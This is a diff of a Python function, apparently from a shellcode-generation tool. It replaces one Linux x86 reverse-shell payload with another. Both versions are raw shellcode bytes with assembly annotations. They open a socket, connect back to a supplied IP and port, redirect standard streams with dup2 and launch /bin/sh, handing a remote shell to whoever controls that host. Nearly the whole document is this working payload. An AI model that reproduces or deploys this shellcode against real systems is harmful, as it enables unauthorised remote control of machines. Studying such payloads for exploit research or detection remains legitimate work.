@@ -53,44 +53,49 @@ def remote(arch, ipStr, portNum) :
     PORT = struct.pack(">H", int(portNum))
 
     if arch == 'x86':
-        result=("\x68" + IP             + #push   IP
-                "\x5e"                  + #pop    esi
-                "\x66\x68" + PORT       + #pushw  PORT
-                "\x5f"                  + #pop    edi
-                "\x6a\x66"              + #push   0x66
-                "\x58"                  + #pop    eax   // sys_socketcall, int call, *args
-                "\x99"                  + #cdq
-                "\x6a\x01"              + #push   0x1
-                "\x5b"                  + #pop    ebx
-                "\x52"                  + #push   edx
-                "\x53"                  + #push   ebx
-                "\x6a\x02"              + #push   0x2
-                "\x89\xe1"              + #mov    ecx,esp   <──┐
-                "\xcd\x80"              + #int    0x80         │
-                "\x93"                  + #xchg   ebx,eax      │
-                "\x59"                  + #pop    ecx          │
-                "\xb0\x3f"              + #mov    al,0x3f  <─┐ │    // sys_dup2, uint oldfd, uint newfd
-                "\xcd\x80"              + #int    0x80       │ │
-                "\x49"                  + #dec    ecx        │ │
-                "\x79\xf9"              + #jns    -0x5      ─┘ │
-                "\xb0\x66"              + #mov    al,0x66      │
-                "\x56"                  + #push   esi          │
-                "\x66\x57"              + #push   di           │
-                "\x66\x6a\x02"          + #pushw  0x2          │
-                "\x89\xe1"              + #mov    ecx,esp      │
-                "\x6a\x10"              + #push   0x10         │
-                "\x51"                  + #push   ecx          │
-                "\x53"                  + #push   ebx          │
-                "\x89\xe1"              + #mov    ecx,esp      │
-                "\xcd\x80"              + #int    0x80         │
-                "\xb0\x0b"              + #mov    al,0xb       │
-                "\x52"                  + #push   edx          │
-                "\x68\x2f\x2f\x73\x68"  + #push   0x68732f2f   │
-                "\x68\x2f\x62\x69\x6e"  + #push   0x6e69622f   │
-                "\x89\xe3"              + #mov    ebx,esp      │
-                "\x52"                  + #push   edx          │
-                "\x53"                  + #push   ebx          │
-                "\xeb\xce")               #jmp    -0x30       ─┘
+        result = ("\x31\xc0"            + #xor    eax, eax
+                  "\x31\xdb"            + #xor    ebx, ebx
+                  "\x31\xc9"            + #xor    ecx, ecx
+                  "\x31\xd2"            + #xor    edx, dex
+                  "\xb0\x66"            + #mov    al, 0x66
+                  "\xb3\x01"            + #mov    bl, 0x1
+                  "\x51"                + #push   ecx
+                  "\x6a\x06"            + #push   0x6
+                  "\x6a\x01"            + #push   0x1
+                  "\x6a\x02"            + #push   0x2
+                  "\x89\xe1"            + #mov    ecx, esp
+                  "\xcd\x80"            + #int    0x80
+                  "\x89\xc6"            + #mov    esi, eax
+                  "\xb0\x66"            + #mov    al, 0x66
+                  "\x31\xdb"            + #xor    ebx, ebx
+                  "\xb3\x02"            + #mov    bl, 0x2
+                  "\x68"     + IP       + #push   IP
+                  "\x66\x68" + PORT     + #pushw  PORT
+                  "\x66\x53"            + #push   bx
+                  "\xfe\xc3"            + #inc    bl
+                  "\x89\xe1"            + #mov    ecx, esp
+                  "\x6a\x10"            + #push   0x10
+                  "\x51"                + #push   ecx
+                  "\x56"                + #push   esi
+                  "\x89\xe1"            + #mov    ecx, esp
+                  "\xcd\x80"            + #int    0x80
+                  "\x89\xd9"            + #mov    ecx, ebx
+                  "\x89\xf3"            + #mov    ebx, esi
+                  "\xfe\xc9"            + #dec    cl       <─┐
+                  "\xb0\x3f"            + #mov    al, 0x3f   │
+                  "\xcd\x80"            + #int    0x80       │ // sys_dup2
+                  "\x75\xf8"            + #jne    -6        ─┘
+                  "\x31\xc0"            + #xor    eax, eax
+                  "\x52"                + #push   edx
+                  GetPushStrAsm('/bin/sh') + #push  /bin/sh
+                  "\x89\xe3"            + #mov    ebx, esp
+                  "\x52"                + #push   edx
+                  "\x53"                + #push   ebx
+                  "\x89\xe1"            + #mov    ecx, esp
+                  "\x52"                + #push   edx
+                  "\x89\xe2"            + #mov    edx, esp
+                  "\xb0\x0b"            + #mov    al, 0xb
+                  "\xcd\x80")             #int    0x80
         
     elif arch == 'x64':
         result=("\x48\x31\xc0"          + #xor    rax, rax
